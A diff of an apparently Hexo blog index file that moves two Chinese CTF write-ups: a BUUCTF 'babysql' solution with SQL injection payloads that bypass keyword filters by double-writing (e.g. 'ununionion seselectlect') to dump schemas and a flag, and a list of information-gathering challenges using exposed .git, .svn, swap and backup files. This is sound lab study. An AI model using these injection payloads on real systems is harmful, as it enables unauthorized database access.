@@ -102,53 +102,6 @@
       </tags>
   </entry>
   <entry>
-    <title>buu-babysql</title>
-    <url>/p/a5cbd811.html</url>
-    <content><![CDATA[<h3 id="极客大挑战：-babysql"><a href="#极客大挑战：-babysql" class="headerlink" title="极客大挑战： babysql"></a>极客大挑战： babysql</h3><p>首先这道题目我一开始尝试了万能钥匙 ，但是发现不行，但是可以肯定的是肯定存在注入的</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDCCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDDCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p>但是爆了错误，但是细心看发现，or不见了应该是被过滤了，估计还过滤了好多东西，</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDFCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p>这样弄居然可以登录，拿到密码，但是没有什么用，其实下面的这些试查找的错误的步骤可以通过用户名排查看看是过滤了什么东西</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDGCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p>继续尝试看看有没有将by也过滤掉了，1‘ order by 3 #结果真是也过滤了</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p>于是尝试一下 双写绕过看看行不行，下面这样看其实双写就绕过去了，但是还有其他的一些错误报出来，经过测试发现其实字段就是3，到4就报错了</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDJCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDACPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p>上面的验证用密码也是可以的。</p>
-<p>另外 一种查看字段数的也可以用联合查询admin’ uunionnion sselectelect 1,2,3#，也是可以登录进去得到一些没用的东西的，因为union，select也被过滤了，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ab union bc select database() #语句查看可以发现</span><br></pre></td></tr></table></figure>
-
-<p>而双写绕过也可以，尝试绕过也可以试一下大写，但是这里不行。</p>
-<p>union和select都被过滤了 ，改造语句再查所有的库</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(schema_name) from information_schema.schemata)%23</span></span><br></pre></td></tr></table></figure>
-
-<p>发现带from和information的被过滤了，于是依旧双写绕过，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?username=admin&amp;password=1&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(schema_name) frfromom infoorrmation_schema.schemata)%23</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDBCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p>于是再查看表，注意那个where也是被绕过了，也是需要双写绕过</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema = &#x27;</span>ctf<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDHCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p>最后再来爆破字段，自然很容易就得到了字段flag</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema = &#x27;</span>ctf<span class="string">&#x27; anandd table_name=&#x27;</span>Flag<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure>
-
-<p>最后拿数据</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect Flag frfromom ctf.Flag)%23</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
-<p>参考博客：<a href="https://blog.csdn.net/guo15890025019/article/details/120958556">https://blog.csdn.net/guo15890025019/article/details/120958556</a></p>
-]]></content>
-      <categories>
-        <category>web ctf</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XFF—SSTI</title>
     <url>/p/c3af6cda.html</url>
     <content><![CDATA[<h2 id="XFF漏洞浅析"><a href="#XFF漏洞浅析" class="headerlink" title="XFF漏洞浅析"></a>XFF漏洞浅析</h2><p>X-Forwarded-for：简称XFF，它代表客户端，也就是HTTP请求的真实IP，只有在通过了HTTP代理<br> 或者负载均衡器时才会添加该项。</p>
@@ -200,6 +153,53 @@
       </categories>
       <tags>
         <tag>XFF-SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buu-babysql</title>
+    <url>/p/a5cbd811.html</url>
+    <content><![CDATA[<h3 id="极客大挑战：-babysql"><a href="#极客大挑战：-babysql" class="headerlink" title="极客大挑战： babysql"></a>极客大挑战： babysql</h3><p>首先这道题目我一开始尝试了万能钥匙 ，但是发现不行，但是可以肯定的是肯定存在注入的</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDCCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDDCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p>但是爆了错误，但是细心看发现，or不见了应该是被过滤了，估计还过滤了好多东西，</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDFCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p>这样弄居然可以登录，拿到密码，但是没有什么用，其实下面的这些试查找的错误的步骤可以通过用户名排查看看是过滤了什么东西</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDGCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p>继续尝试看看有没有将by也过滤掉了，1‘ order by 3 #结果真是也过滤了</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p>于是尝试一下 双写绕过看看行不行，下面这样看其实双写就绕过去了，但是还有其他的一些错误报出来，经过测试发现其实字段就是3，到4就报错了</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDFDJCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDACPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p>上面的验证用密码也是可以的。</p>
+<p>另外 一种查看字段数的也可以用联合查询admin’ uunionnion sselectelect 1,2,3#，也是可以登录进去得到一些没用的东西的，因为union，select也被过滤了，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ab union bc select database() #语句查看可以发现</span><br></pre></td></tr></table></figure>
+
+<p>而双写绕过也可以，尝试绕过也可以试一下大写，但是这里不行。</p>
+<p>union和select都被过滤了 ，改造语句再查所有的库</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(schema_name) from information_schema.schemata)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>发现带from和information的被过滤了，于是依旧双写绕过，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?username=admin&amp;password=1&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(schema_name) frfromom infoorrmation_schema.schemata)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDBCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p>于是再查看表，注意那个where也是被绕过了，也是需要双写绕过</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema = &#x27;</span>ctf<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDHCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p>最后再来爆破字段，自然很容易就得到了字段flag</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema = &#x27;</span>ctf<span class="string">&#x27; anandd table_name=&#x27;</span>Flag<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>最后拿数据</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,2,(seselectlect Flag frfromom ctf.Flag)%23</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADEDGDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
+<p>参考博客：<a href="https://blog.csdn.net/guo15890025019/article/details/120958556">https://blog.csdn.net/guo15890025019/article/details/120958556</a></p>
+]]></content>
+      <categories>
+        <category>web ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -402,96 +402,6 @@
       </categories>
       <tags>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息收集</title>
-    <url>/p/312e3d12.html</url>
-    <content><![CDATA[<h1 id="信息收集🐱‍🐉🥗🥙🧃🍵🌳"><a href="#信息收集🐱‍🐉🥗🥙🧃🍵🌳" class="headerlink" title="信息收集🐱‍🐉🥗🥙🧃🍵🌳"></a>信息收集🐱‍🐉🥗🥙🧃🍵🌳</h1><p>信息收集😶</p>
-<h2 id="2-1-F12查看源代码得到源代码"><a href="#2-1-F12查看源代码得到源代码" class="headerlink" title="2.1 F12查看源代码得到源代码"></a>2.1 F12查看源代码得到源代码</h2><h2 id="2-3-burpsuite抓包得到flag"><a href="#2-3-burpsuite抓包得到flag" class="headerlink" title="2.3 burpsuite抓包得到flag"></a>2.3 burpsuite抓包得到flag</h2><h2 id="2-4-访问url-网址-robots-txt"><a href="#2-4-访问url-网址-robots-txt" class="headerlink" title="2.4 访问url(网址)/robots.txt"></a><strong>2.4</strong> 访问url(网址)/robots.txt</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>然后访问url/flagishere.txt：</p>
-<p> <img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>总结：先访问robots.txt，、查看源代码后得知再访问flagishere.txt，即可得到flag。</p>
-<h2 id="2-5-访问url-index-phps-下载备份文件"><a href="#2-5-访问url-index-phps-下载备份文件" class="headerlink" title="2.5 访问url/index.phps,下载备份文件"></a>2.5 访问url/index.phps,下载备份文件</h2><p>用文本格式打开，找到flag：</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>下载后用记事本打开即可得到flag：</p>
-<p>   <img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>总结：访问url/index.phps,下载备份文件后打开即可得到flag。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="2-6-访问url-www-zip："><a href="#2-6-访问url-www-zip：" class="headerlink" title="2.6 访问url/www.zip："></a>2.6 访问url/<a href="http://www.zip：">www.zip：</a></h2><p>接着访问url/fl000g。txt，即可得到flag</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>总结：先访问url/<a href="http://www.zip,打开压缩包后访问fl000.txt,即可得到flag./">www.zip，打开压缩包后访问fl000.txt，即可得到flag。</a></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="2-7考察git代码泄露"><a href="#2-7考察git代码泄露" class="headerlink" title="2.7考察git代码泄露"></a>2.7考察git代码泄露</h2><p>直接访问url/.git/index.php</p>
-<p><img src="image-20211105122221977.png" alt="image-20211105122221977"></p>
-<p>git源码泄露漏洞总结：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/qq_36869808/article/details/88909961</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>1.git文件夹分析</p>
-<p>2.git文件夹利用原理</p>
-<p>3.diggit脚本简单分析</p>
-<p>4.githack脚本简单分析</p>
-<p>5.git源码泄露扫描</p>
-<p>6.git源码泄露实例</p>
-</blockquote>
-<h2 id="2-8考察信息svn泄露"><a href="#2-8考察信息svn泄露" class="headerlink" title="2.8考察信息svn泄露"></a>2.8考察信息svn泄露</h2><p>直接访问url/.svn/</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>SVN（subversion）是源代码版本管理软件。<a href="https://www.cnblogs.com/batsing/p/svn-bug.html">https://www.cnblogs.com/batsing/p/svn-bug.html</a></p>
-<h2 id="2-9考察vim缓存信息泄露"><a href="#2-9考察vim缓存信息泄露" class="headerlink" title="2.9考察vim缓存信息泄露"></a>2.9考察vim缓存信息泄露</h2><p>直接访问url/index.php.swp</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>打开下载文件后，直接出现flag。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>这是信息泄露的一些笔记：<a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p>
-<h2 id="2-10参考cookie，直接抓包"><a href="#2-10参考cookie，直接抓包" class="headerlink" title="2.10参考cookie，直接抓包"></a>2.10参考cookie，直接抓包</h2><p>在请求数据包看到flag,注{ }通过了url编码</p>
-<p>根据提示“cookie 只是一块饼干，不能存放任何隐私数据”，看到cookie，直接抓包</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="2-11域名隐藏信息"><a href="#2-11域名隐藏信息" class="headerlink" title="2.11域名隐藏信息"></a>2.11域名隐藏信息</h2><p>根据提示“域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息”<br> 通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="2-12网站信息查看"><a href="#2-12网站信息查看" class="headerlink" title="2.12网站信息查看"></a>2.12网站信息查看</h2><p>有时候网站上的公开信息，就是管理员常用密码</p>
-<p>查看robots.txt文件，紧接着再访问admin登录，用户名admin。密码：在页面的最下方</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>密码就在页面下方</p>
-<h2 id="2-13技术文档敏感信息"><a href="#2-13技术文档敏感信息" class="headerlink" title="2.13技术文档敏感信息"></a>2.13技术文档敏感信息</h2><p>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
-<p>根据题目提示 技术文档 在页面下面发现 document 下载发现里面存在后台地址和用户名密码登录成功获 得flag</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>登录即可得到flag，但是网站打不开登录</p>
-<h2 id="2-14泄露重要-editor-的信息"><a href="#2-14泄露重要-editor-的信息" class="headerlink" title="2.14泄露重要(editor)的信息"></a>2.14泄露重要(editor)的信息</h2><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
-<p>根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>url后面添加/editor ，再寻找上传文件的按钮，看到var再进一步搜索，最后再url后面加上nothinghere/fl000g.txt</p>
-<h2 id="2-15公开信息泄露"><a href="#2-15公开信息泄露" class="headerlink" title="2.15公开信息泄露"></a>2.15公开信息泄露</h2><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目提示：访问/admin页面 发现有一个忘记密码操作，需要输入地址 在主页面下面看到QQ邮箱，通过QQ号查询邮箱，是西安的 修改密码成功，用户名 admin 登录成功获得flag</span><br></pre></td></tr></table></figure>
-
-<p>首先需要admin访问，然后选择忘记密码，而密保城市是西安，输入之后直接修改密码，重新登录就可以查看flag。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="2-16考察PHP探针"><a href="#2-16考察PHP探针" class="headerlink" title="2.16考察PHP探针"></a>2.16考察PHP探针</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
-<p><strong>解题过程：url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</strong></p>
-<h2 id="2-17查找到ctfer-com的真实IP"><a href="#2-17查找到ctfer-com的真实IP" class="headerlink" title="2.17查找到ctfer.com的真实IP"></a>2.17查找到ctfer.com的真实IP</h2><p>透过重重缓存，查找到ctfer.com的真实IP，提交</p>
-<p>直接ping <a href="http://www.ctfshow.com/">www.ctfshow.com</a> 获得flag</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="2-18查看js文件，查看flag的条件"><a href="#2-18查看js文件，查看flag的条件" class="headerlink" title="2.18查看js文件，查看flag的条件"></a>2.18查看js文件，查看flag的条件</h2><p>首先查看源代码，接着进入js查看文件</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>利用谐音访问110.php</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="2-19密钥前端位置盗取"><a href="#2-19密钥前端位置盗取" class="headerlink" title="2.19密钥前端位置盗取"></a>2.19密钥前端位置盗取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure>
-
-<p>端查看源代码，post提交用户名密码</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="2-20mdb文件"><a href="#2-20mdb文件" class="headerlink" title="2.20mdb文件"></a>2.20mdb文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件</span><br><span class="line"></span><br><span class="line"> 直接查看url路径添加/db/db.mdb</span><br><span class="line"></span><br><span class="line">下载后直接打开，搜索得到flag</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-]]></content>
-      <categories>
-        <category>web ctf</category>
-      </categories>
-      <tags>
-        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -822,6 +732,96 @@
       </tags>
   </entry>
   <entry>
+    <title>信息收集</title>
+    <url>/p/312e3d12.html</url>
+    <content><![CDATA[<h1 id="信息收集🐱‍🐉🥗🥙🧃🍵🌳"><a href="#信息收集🐱‍🐉🥗🥙🧃🍵🌳" class="headerlink" title="信息收集🐱‍🐉🥗🥙🧃🍵🌳"></a>信息收集🐱‍🐉🥗🥙🧃🍵🌳</h1><p>信息收集😶</p>
+<h2 id="2-1-F12查看源代码得到源代码"><a href="#2-1-F12查看源代码得到源代码" class="headerlink" title="2.1 F12查看源代码得到源代码"></a>2.1 F12查看源代码得到源代码</h2><h2 id="2-3-burpsuite抓包得到flag"><a href="#2-3-burpsuite抓包得到flag" class="headerlink" title="2.3 burpsuite抓包得到flag"></a>2.3 burpsuite抓包得到flag</h2><h2 id="2-4-访问url-网址-robots-txt"><a href="#2-4-访问url-网址-robots-txt" class="headerlink" title="2.4 访问url(网址)/robots.txt"></a><strong>2.4</strong> 访问url(网址)/robots.txt</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>然后访问url/flagishere.txt：</p>
+<p> <img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>总结：先访问robots.txt，、查看源代码后得知再访问flagishere.txt，即可得到flag。</p>
+<h2 id="2-5-访问url-index-phps-下载备份文件"><a href="#2-5-访问url-index-phps-下载备份文件" class="headerlink" title="2.5 访问url/index.phps,下载备份文件"></a>2.5 访问url/index.phps,下载备份文件</h2><p>用文本格式打开，找到flag：</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>下载后用记事本打开即可得到flag：</p>
+<p>   <img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>总结：访问url/index.phps,下载备份文件后打开即可得到flag。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="2-6-访问url-www-zip："><a href="#2-6-访问url-www-zip：" class="headerlink" title="2.6 访问url/www.zip："></a>2.6 访问url/<a href="http://www.zip：">www.zip：</a></h2><p>接着访问url/fl000g。txt，即可得到flag</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>总结：先访问url/<a href="http://www.zip,打开压缩包后访问fl000.txt,即可得到flag./">www.zip，打开压缩包后访问fl000.txt，即可得到flag。</a></p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="2-7考察git代码泄露"><a href="#2-7考察git代码泄露" class="headerlink" title="2.7考察git代码泄露"></a>2.7考察git代码泄露</h2><p>直接访问url/.git/index.php</p>
+<p><img src="image-20211105122221977.png" alt="image-20211105122221977"></p>
+<p>git源码泄露漏洞总结：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/qq_36869808/article/details/88909961</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>1.git文件夹分析</p>
+<p>2.git文件夹利用原理</p>
+<p>3.diggit脚本简单分析</p>
+<p>4.githack脚本简单分析</p>
+<p>5.git源码泄露扫描</p>
+<p>6.git源码泄露实例</p>
+</blockquote>
+<h2 id="2-8考察信息svn泄露"><a href="#2-8考察信息svn泄露" class="headerlink" title="2.8考察信息svn泄露"></a>2.8考察信息svn泄露</h2><p>直接访问url/.svn/</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>SVN（subversion）是源代码版本管理软件。<a href="https://www.cnblogs.com/batsing/p/svn-bug.html">https://www.cnblogs.com/batsing/p/svn-bug.html</a></p>
+<h2 id="2-9考察vim缓存信息泄露"><a href="#2-9考察vim缓存信息泄露" class="headerlink" title="2.9考察vim缓存信息泄露"></a>2.9考察vim缓存信息泄露</h2><p>直接访问url/index.php.swp</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>打开下载文件后，直接出现flag。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>这是信息泄露的一些笔记：<a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p>
+<h2 id="2-10参考cookie，直接抓包"><a href="#2-10参考cookie，直接抓包" class="headerlink" title="2.10参考cookie，直接抓包"></a>2.10参考cookie，直接抓包</h2><p>在请求数据包看到flag,注{ }通过了url编码</p>
+<p>根据提示“cookie 只是一块饼干，不能存放任何隐私数据”，看到cookie，直接抓包</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="2-11域名隐藏信息"><a href="#2-11域名隐藏信息" class="headerlink" title="2.11域名隐藏信息"></a>2.11域名隐藏信息</h2><p>根据提示“域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息”<br> 通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p>
